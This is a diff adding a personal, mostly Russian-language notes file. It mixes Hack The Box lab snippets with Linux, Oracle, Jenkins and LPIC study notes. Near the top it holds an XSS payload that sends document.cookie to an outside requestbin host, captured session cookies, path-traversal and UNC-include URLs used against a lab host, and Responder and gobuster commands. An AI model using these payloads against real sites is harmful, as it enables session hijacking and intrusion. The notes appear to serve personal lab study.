@@ -1,0 +1,630 @@
+eyJ1c2VyIjp7ImlkIjo1LCJ1c2VybmFtZSI6InBhdmVsIn19.Z9poEA.AtbViWDKV0U9vyC-FfAB4NgaqBM
+
+<img src="x"onerror="fetch('http://requestbin.whapi.cloud/1058g8f1?cookie=' + document.cookie)"/>
+
+eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6IlJlbmF0YSJ9fQ.Z9qitw.ypOr4v_17e4OZw6RtHyD16nrQuA
+
+http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+
+git clone https://github.com/lgandx/Responder
+
+http://unika.htb/?page=//10.0.2.15/somefile
+
+
+echo $SHELL
+tldr
+nmtui
+sudo ip link set eth0
+dhclient eth0
+
+
+go install github.com/OJ/gobuster/v3@latest
+echo 'export PATH=$PATH:~/go/bin' >> ~/.zshrc
+source ~/.zshrc
+
+git clone https://github.com/danielmiessler/SecLists.git
+
+gobuster vhost -u http://thetoppers.htb/ -w /opt/useful/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+
+
+.\PECmd.exe -d "C:\Users\Pavel\Desktop\Triage\Workstation\2024-05-21T033012_triage_asset\C\Windows\prefetch" --csv . --csvf "C:\Users\Pavel\Downloads\outputfilename.csv"
+
+на что обращать внимание при сравнении двух свойств событий атаки на AD Kerberos:
+1. Имя учетной записи , которая НЕ является учетной записью службы или компьютера (заканчивается на $), то есть любой обычной учетной записью пользователя домена (это будет учетная запись, которая была скомпрометирована и с которой злоумышленник выполнил эту атаку).
+2. Названия служб , которые НЕ заканчиваются на $.
+3. Тип шифрования тикета будет 0x17, что соответствует шифрованию RC4, что позволяет злоумышленникам легко взломать хеш.
+
+
+В законных случаях использования операций с билетами Kerberos тип шифрования будет 0x12 или 0x11. 
+Но если мы увидим тип шифрования «0x17», который является шифрованием RC4, это будет подсказкой для дальнейшего изучения
+Примечание : Все основные инструменты с открытым исходным кодом, такие как Impacket и Rubeus, запрашивают билеты с типом шифрования RC4.
+
+Помнить про UTC (-3 часа от мск)
+
+
+В Wireshark когда трудно отследить движение пакета, или он его дальнейшее передвижение скрыто, ПКМ на пакет и Ctrl+Alt+Shift+T
+
+
+Если забыт пароль от system в sql plus/oracle
+в смd: 
+ren C:\app\oracle\product\19.0.0\dbhome_1\database\PWDORCL.ora PWDORCL.old
+orapwd file=C:\app\oracle\product\19.0.0\dbhome_1\database\PWDORCL.ora entries=10 force=y
+Меняете пароль и заходите через osql dev
+Новое подключение:
+Имя подключения: SYS_SYSDBA
+Тип подключения: Basic или TNS
+Имя пользователя: SYS
+Пароль: ваш пароль для SYS
+Роль: SYSDBA
+
+
+Подключение с рут правами:
+sqlplus sys/oracle78910@XE as sysdba
+sqlplus sys/oracle78910@XE/localhost:1521/ORCL
+просмотр всех пользователей в бд:
+SELECT username FROM dba_users WHERE account_status = 'OPEN';
+конфиг файл для подключения бд:
+%ORACLE_HOME%\network\admin\tnsnames.ora
+прописать в нем:
+XE =
+  (DESCRIPTION =
+    (ADDRESS = (PROTOCOL = TCP)(HOST = localhost)(PORT = 1521))
+    (CONNECT_DATA =
+      (SERVER = DEDICATED)
+      (SERVICE_NAME = XE)
+    )
+  )
+
+LISTENER_XE =
+  (ADDRESS = (PROTOCOL = TCP)(HOST = localhost)(PORT = 1521))
+
+базовый конфиг для версии ХЕ, прописывается в конце файла
+
+
+Установить SID:
+set ORACLE_SID=XE
+
+
+В Oracle 12c+ база данных по умолчанию работает в контейнерной модели (CDB + PDB).
+Common User (общий пользователь) должен иметь имя в формате C##<имя> (например, C##USER1).
+Если имя не начинается с C##, Oracle считает его локальным пользователем (Local User), который должен создаваться внутри конкретной PDB
+Если вам нужно имя без C##, выполните перед созданием:
+ALTER SESSION SET "_ORACLE_SCRIPT"=TRUE;
+
+GRANT DBA TO HR_NEW;
+GRANT READ, WRITE ON DIRECTORY EXAMPLE_DIRECTORY TO HR_NEW;
+
+Переключитесь в PDB:
+ALTER SESSION SET CONTAINER = XEPDB1;
+
+подключение, создание и выдача прав пользователю для работы в DBA:
+CONNECT sys/oracle@ORCLCDB AS SYSDBA
+CREATE USER C##db_admin IDENTIFIED BY "Secure123";
+GRANT DBA TO C##db_admin;
+SELECT * FROM DBA_ROLE_PRIVS WHERE GRANTEE = 'C##DB_ADMIN';
+
+разблокировать пользователя из под админа:
+ALTER USER C##db_admin ACCOUNT UNLOCK;
+Если пароль истёк или его нужно сбросить:
+ALTER USER ваш_пользователь IDENTIFIED BY новый_пароль;
+
+
+impdp system/oracle@XE 
+directory=DATA_PUMP_DIR 
+dumpfile=mvd_dt_201606.DMP
+
+C:/app/Pavel/product/21c/admin/XE/dpdump/mvd_dt_201606.dmp
+C:\app\Pavel\product\21c\admin\xe\dpdump/mvd_dt_201606.dmp
+copy "C:\app\Pavel\product\21c\admin\xe\dpdump/mvd_dt_201606.dmp" "C:\app\Pavel\dump_folder\"
+
+
+imp SYSTEM/oracle@XE file=C:\app\Pavel\dump_folder\mvd_dt_201606.dmp log=C:\app\Pavel\dump_folder\imp_mvd.log full=Y ignore=Y
+
+
+CREATE USER EFZ_OBMEN 
+IDENTIFIED BY obmen
+DEFAULT TABLESPACE USERS
+TEMPORARY TABLESPACE TEMP
+QUOTA UNLIMITED ON USERS;
+
+
+Что происходит, когда запускаешь линукс:
+1 - Аппаратная инициализация(POST);
+2 - Загрузчик(BootLoader);
+3 - Запуск и первичная инициализация ядра(kernal), обнаружение оборудования, загрузка драйверов и подключение файловых систем;
+4 - Запуск системных служб(демонов);
+5 - Старт графической или консольной сессии;
+6 - Пользовательский сеанс;
+
+
+
+1:
+Аппаратная инициализация(POST)
+- Нажатие кнопки питания
+Материнская плата подаёт питание на компоненты.
+При подаче питания материнская плата активирует PSU (блок питания).
+CPU получает сигнал RESET и начинает выполнять код из микропрограммы (BIOS/UEFI)
+- POST (Power-On Self-Test)
+BIOS/UEFI проверяет:
+	Исправность CPU, RAM, чипсета.
+	Наличие и работоспособность подключённых устройств (диски, GPU, клавиатура).
+	CMOS-память (настройки BIOS: дата, время, порядок загрузки).
+Если ошибка — звуковые сигналы или сообщения на экране.
+- Выбор загрузочного устройства
+BIOS/UEFI ищет загрузочное устройство (HDD, SSD, USB) в порядке, указанном в настройках
+	BIOS: Читает MBR (Master Boot Record) первого диска из списка загрузки (Boot Order)
+	UEFI: Ищет FAT32-раздел (ESP, EFI System Partition) с файлами .efi (например, \EFI\ubuntu\grubx64.efi), загружает EFI-приложение (например, GRUB2).
+
+
+2:
+Загрузчик(BootLoader)
+- BIOS → MBR (Master Boot Record)
+Если используется BIOS, загружается первый сектор диска (MBR), где находится код загрузчика (например, GRUB).
+MBR ограничен 512 байтами, поэтому обычно загружает второй этап загрузчика из /boot.
+- UEFI → ESP (EFI System Partition)
+В UEFI загрузчик (например, grubx64.efi) лежит в FAT32-разделе ESP (обычно /boot/efi).
+- GRUB (или systemd-boot)
+Показывает меню выбора ОС (если их несколько).
+Как только пользователь выбирает нужный пункт меню (либо по истечении тайм-аута), Grub находит связанный с этим пунктом меню образ ядра Linux на диске (обычно это файл /boot/vmlinuz)
+- Загружает ядро Linux (vmlinuz) и initramfs (временная корневая ФС в памяти)
+- Загружает их в память и передает управление ядру.
+* vmlinuz - Буква z вместо x на конце, в свою очередь, означает, что образ сжат с помощью утилиты gzip (алгоритм Deflate, тот же, что в классическом ZIP).
+
+
+3:
+Запуск и первичная инициализация ядра(Kernel)
+- Декомпрессия и инициализация
+Ядро (vmlinuz) распаковывается и запускается.
+Определяет железо (процессор, память, устройства) через драйверы.
+- Монтирование корневой ФС
+Ядро монтирует корневую файловую систему (/) из initramfs.
+Ядро распаковывает архив initramfs (обычно он имеет имя вида /boot/initramfs-linux.img и представляет собой архив cpio, сжатый с помощью gzip)
+Initramfs включает в себя базовый набор компонентов Linux-дистрибутива: стандартные системные каталоги /bin, /lib, /etc...
+Initramfs содержит базовые драйверы (например, для LVM или шифрования).
+Смысл существования процесса initramfs: 
+ - загрузить драйверы для подключения реальной корневой файловой системы до того, как она будет подключена. 
+Именно это и происходит, когда система запускает скрипт /init. 
+Он определяет установленные в систему накопители, загружает в ядро драйверы для работы с ними, а затем подключает нужный раздел нужного накопителя 
+(о том, какой именно, ядро узнает благодаря переданному при загрузке параметру root) к корню, перекрывая таким образом содержимое initramfs.
+Затем скрипт запускает /sbin/init
+- Запуск первого процесса (/sbin/init)
+Ядро ищет init в:
+	- Параметрах ядра (init=/bin/bash).
+	- /sbin/init → обычно симлинк на systemd.
+	- Если init не найден → Kernel panic.
+
+
+4:
+Systemd и демоны
+- Systemd как PID=1
+Читает конфиги:
+/etc/systemd/system/default.target (обычно graphical.target).
+Юниты (*.service, *.mount) из /usr/lib/systemd/system/.
+- Запускает сервисы параллельно (в отличие от SysVinit).
+udev	-	Динамическое создание /dev/.
+dbus	IPC -	(межпроцессное взаимодействие).
+NetworkManager	-	Управление сетью.
+getty@tty1	-	Виртуальные консоли (Ctrl+Alt+F1).
+- Таргеты (аналоги runlevels)
+multi-user.target	-	Консольный режим (без GUI).
+graphical.target	-	Графический интерфейс.
+rescue.target	-	Аварийная однопользовательская оболочка.
+
+
+5:
+Графическая подсистема
+- Дисплейный менеджер (DM)
+	GDM (GNOME) → /usr/bin/gdm3.
+	SDDM (KDE) → /usr/bin/sddm.
+	LightDM → Лёгкий DM для XFCE/LXDE.
+- Что делает DM?
+	Запускает Xorg/Wayland.
+	Показывает экран входа.
+	Авторизует пользователя через PAM.
+X11 (Xorg)	Wayland (weston) - better
+- Окружение рабочего стола (DE)
+	GNOME → gnome-shell, mutter.
+	KDE Plasma → plasmashell, kwin.
+	XFCE → xfwm4, xfdesktop.
+- DE:
+	Рисует окна, панели, меню.
+	Управляет обоями, виджетами.
+	Запускает автозагрузку (~/.config/autostart/).
+
+
+6:
+Пользовательский сеанс
+- Авторизация через PAM
+	Проверяет логин/пароль в /etc/passwd и /etc/shadow.
+	Может требовать 2FA или биометрию (если настроено).
+- Старт сессии
+	Базовые переменные ($PATH, $HOME) → /etc/profile, ~/.profile.
+	Скрипты входа → /etc/xdg/autostart/.
+	Systemd user-юниты → ~/.config/systemd/user/.
+
+
+
+jenkins
+
+bag fix:
+plugin error
+
+1. очистка кэша:
+net stop Jenkins
+cd /d "C:\Program Files\Jenkins"
+rmdir /s /q plugins
+mkdir plugins
+net start Jenkins
+
+2. принудительное обновление Update Center
+Создайте файл update-center.json вручную:
+echo {} > "C:\Program Files\Jenkins\hudson.model.UpdateCenter.xml"
+
+3. скачать плагин разными способами:
+# Через прямой URL
+curl -L -o cloudbees-folder.hpi https://updates.jenkins.io/download/plugins/cloudbees-folder/latest/cloudbees-folder.hpi
+# Через зеркало
+curl -L -o cloudbees-folder.hpi https://mirrors.tuna.tsinghua.edu.cn/jenkins/plugins/cloudbees-folder/latest/cloudbees-folder.hpi
+
+
+
+сервер таск:
+- дать права, чтобы каждый из пользователей мог читать файлы других пользователей в каталоге, но ни один из них не мог изменять файл, 
+принадлежащий другому пользователю. 
+Пользователи должны иметь возможность изменять свои собственные файлы.
+зменить файл shared/ALL, чтобы любой из этих четырех пользователей мог записывать в него 
+больше контента, но предыдущий (существующий) контент не мог быть изменен.
+
+*в дальнейшем сделать через (ACL)
+
+решение:
+1. создаем группу и добавляем в нее пользователей:
+sudo groupadd project_team
+sudo usermod -aG project_team user1, user2, user3
+
+
+*2. настройка каталогов:
+sudo mkdir -p /home/admin/shared
+sudo chown admin:project_team /home/admin/shared
+sudo chmod 2770 /home/admin/shared  # 2 = SGID (новые файлы наследуют группу)
+
+
+*3. Установим umask для автоматических прав (если файлы создаются вручную):
+echo "umask 002" >> ~/.bashrc  # Для всех пользователей (файлы: 664, папки: 775)
+source ~/.bashrc
+
+
+*4. Включим Sticky Bit для запрета удаления/переименования чужих файлов:
+sudo chmod +t /home/admin/shared  # Теперь только владелец или root может удалить файл
+
+
+5. файл принадлежит правильной группе (например, project_team), и установим права:
+sudo chown admin:project_team shared/ALL  # Владелец: admin, группа: project_team
+sudo chmod 664 shared/ALL                # Владелец и группа: чтение + запись, остальные: чтение
+
+
+6. только дописывать в конец файла, но не могли изменять существующее содержимое, атрибут (a) (append-only) через chattr:
+sudo chattr +a shared/ALL
+
+
+
+**
+
+2. Настроить каталог /home/admin/shared
+sudo mkdir -p /home/admin/shared
+sudo chown admin:project_team /home/admin/shared
+sudo chmod 770 /home/admin/shared
+sudo setfacl -R -d -m g:project_team:rwX /home/admin/shared  # X = x только для папок
+sudo setfacl -R -m g:project_team:rwX /home/admin/shared
+
+
+3. Установить маску прав по умолчанию
+sudo setfacl -R -d -m o::r-X /home/admin/shared  # Остальные (не из группы) — только чтение
+
+
+4. Запретить изменение чужих файлов (используем chmod)
+# После создания файла:
+chmod 644 file.txt  # Владелец: rw-, группа: r--, остальные: r--
+
+
+
+
+linux:
+На GNU/Linux системах есть возможность установить модули для работы с множеством различных типов файловых систем, 
+включая файловые системы других операционных систем, например NTFS. Но на NTFS нет некоторых функций, 
+необходимых для работы линукса – допустим, прав, как в UNIX-подобных системах и т.п., 
+вследствие чего невозможно установить Linux на NTFS, хотя и можно использовать такую файловую систему для хранения пользовательских файлов. 
+Windows системы же не содержат нужных драйверов для работы с файловыми системами EXT4 или XFS, на которых обычно устанавливается Linux. 
+Из-за чего, если у вас 2 операционные системы на компьютере, на Линуксе видны файлы Windows, а чтобы увидеть содержимое линуксовых файловых систем, 
+на Windows надо установить специальные утилиты.
+
+таск1:
+Объединить (слить) все 338 файлов в /home/admin/polldayregistrations_enregistjourduscrutin?????.csv 
+в один файл /home/admin/all.csv с содержимым всех CSV-файлов в любом порядке. 
+Должна быть только одна строка с названиями столбцов в качестве заголовка.
+решение:
+awk 'FNR==1 && NR==1 {print; next} FNR>1' /home/admin/polldayregistrations_enregistjourduscrutin*.csv > /home/admin/all.csv
+
+таск2:
+найти конкретое слово в определенной директории:
+решение:
+find /proc/sys/ -type f -exec grep -l "secret:" {} + 2>/dev/null
+
+errlin:
+Если пакет не найден:
+Добавить Debian репозиторий (Kali основан на Debian Testing/Unstable):
+/etc/apt/sources.list и добавьть:
+
+deb http://deb.debian.org/debian stable main contrib non-free
+Затем обновить и установить:
+
+sudo apt update
+sudo apt install ...
+
+
+errlin:
+mount /dev/sdb1 /mnt/HarD
+mount  что	куда
+
+
+квотирование:
+*soft/hard
+- install quota
+vim /etc/fstab (/dev/sdb1       /mnt/hard_dr    auto    rw,user,auto,usrquota,grpquota  0       0)
+- quotaoff /./.
+- quotaon /./.
+- quota -v
+- edquota -u user
+- requota /./.
+
+   
+Убить все фоновые процессы
+kill -9 $(jobs -p)
+
+
+
+
+soft/hard links 
+ln -s ...
+soft links - "Ярлык" на файл;
+Если оригинал удалить — ссылка станет "битой" (не будет работать);
+
+ln ...
+hard links - Это альтернативное имя для того же самого файла (тот же inode);
+Если удалить оригинал — данные останутся доступны через жёсткую ссылку;
+
+
+
+итог по курсу LPIC 101:
+
+
+запукс системы(BIOS/UEFI) - первая стадия загрузки(MBR/GPT) 
+- втрая стадия загрузки(LILO/GRUB) - запуск ядра(Linux Kernal)
+- пользовательская среда(init)
+
+Ismod
+- информация о модулях ядра;
+modinfo
+- информация о конкретном модуле
+rmmod
+- удаление модуля ядра;
+insmod
+- установка модуля ядра;
+modprobe
+- деликатное удаление или добавление модулей.
+
+udevadm
+info
+- получение информации из БД;
+trigger
+- запросить события для устройства;
+settle
+- дождаться завершения обработки;
+control
+- управление демоном;
+monitor
+- следить за событиями;
+test
+- симулировать запуск события.
+
+вывод оборудования:
+Ismod
+- информация о модулях ядра;
+Ispci
+- информация об устройствах РСІ;
+Ispcmcia 
+- информация об устройствах РСМСІА;
+Isusb
+- информация о шине USB;
+Ishal
+— база устройств HAL;
+
+система инициализации в линукс:
+init в стиле - SysV (runlevel)
+init в стиле - systemd (многопотосность)
+init в стиле - Upstart (отслеживание событий)
+
+Init - управление инициализацией
+Telinit - управление процессом init
+Wall - вывод сообщения пользователям системы
+Halt - выключение компьютера
+Reboot - перезагрузка компьютера
+Shutdown - запланированное выключение
+Service service_name start | stop | reload | restart
+
+systemctl list-units -type=target
+- узнать запущенные таргеты;
+systemctl isolate name.target
+- переключиться на другой;
+systemctl set-default -f name. target
+- установить по умолчанию.
+ournald - служба журналирования;
+Systemctl reboot | poweroff | suspend | hibernate | hybrid-sleep
+Systemctl start | stop | reload | restart | status unit
+
+
+﻿/ 
+- корневая файловая система, самый большой раздел;
+/bin
+- базовые бинарники команд;
+/boot
+- файлы загрузчика;
+/dev
+- устройства;
+/etc
+- конфигурация ПК;
+/home
+- домашние папки;
+/lib
+- библиотеки и модули ядра;
+/proc
+- информация о работающей системе;
+/media
+- монтирование носителей;
+/mnt
+- монтирование носителей;
+/opt
+- дополнительное ПО;
+/root
+- домашняя папка админа;
+/sbin
+- основные программы настройки системы;
+/srv
+- данные для системных служб;
+/tmp
+- временные файлы;
+/usr
+- бинарники файлы пользователей;
+/var
+- переменные.
+/﻿﻿Swap 
+- никуда не монтируется
+
+
+утилиты для поиска файлов или информации в них:
+• Grep
+- утилита поиска по содержимому;
+• Find
+- утилита поиска файлов по свойствам;
+• Locate
+- быстрый поиск файлов;
+• Which
+- поиск команды;
+• Туре
+- вывод точной команды;
+• Whereis
+- поиск команды, исходников и мануала.
+
+ввод и вывод:
+Stdin (o) - ввод;
+Stdout (1) - вывод;
+Stderr (2) - вывод ошибки;
+> - передать в;
+>> - дописать в;
+< - взять из;
+| - отправить следующей команде;
+
+Тее - отправить в файл и на стандартный вывод;
+Xargs - построчно передать на ввод команде;
+
+
+регулярные выражения:
+
+\<text - слова начинающиеся с text;
+text\> - слова заканчивающиеся на text;
+^ - начало строки;
+$ - конец строки;
+[a-z] - диапазон от а до z;
+[^t] - не буква t;
+\[ - воспринять символ [ буквально;
+. - любой символ;
+a|z - а или z.
+
+
+
+VIM:
+e b - конец и начало слова;
+( ) - конец и начало предложения;
+{ } - конец и начало абзаца;
+^ $ - конец и начало строки;
+1G G - конец и начало файла;
+
+Уу - скопировать строку; 
+yw - скопировать слово; 
+yl - скопировать символ;
+dd - вырезать строку; 
+dw - вырезать слово; 
+dl - вырезать символ;
+р - вставить.
+
+/ - ﻿﻿начать поиск ниже;
+? - ﻿﻿начать поиск выше;
+N и n - ﻿﻿продолжить поиск;
+:e - ﻿﻿отменить изменения;
+:W - ﻿﻿записать изменения;
+:q - выйти из файла;
+:q! или ZQ - ﻿﻿выйти не сохраняя;
+:wq! или ZZ - ﻿﻿выйти и сохранить;
+
+
+
+работа с дисками и раздедами;
+df (disk free) - свободное и занятое место в файловых системах;
+df-h - в понятных единцах; df-i - доступные и занятые inode.
+du (disk usage) - размер папок; du -h - в понятных единицах; du --summarize - один уровень вложения.
+Is -I - размер файлов и папок в текущем каталоге;
+Is -і - номера inode.
+
+debugfs - инструмент отладки файловой системы;
+tune2fs - инструмент настройки параметров файловой системы;
+dumpe2fs - вывод информации о файловой
+системе.
+
+
+монтирование:
+mount устройство точка_монтирования
+umount устройство
+ИЛИ
+umount точка_монтирования
+/etc/fstab:
+устройство точка_монтирования тип_файловой_системы параметры dump pass
+
+
+назначаение прав:
+chown
+- установка владельца;
+chgrp
+- установка группы владельцев;
+chmod
+- установка прав доступа;
+
+
+eXecute = 1	Write = 2		Read = 4
+
+- = 0
+x = 1
+w = 2
+wx = 3
+r = 4
+rx = 5
+rw = 6
+rwx = 7
+
+  rwx		   rwx		 rwx	
+владелец|группа|остальные| файл.txt
+
+
+
+маска(ставится перед rwx):
+umask
+- маска создания файлов и папок;
+suid
+- бит запуска от имени владельца;
+sgid
+- бит запуска от имени группы владельцев;
+sticky
+- бит защиты содержимого.
+
+
+
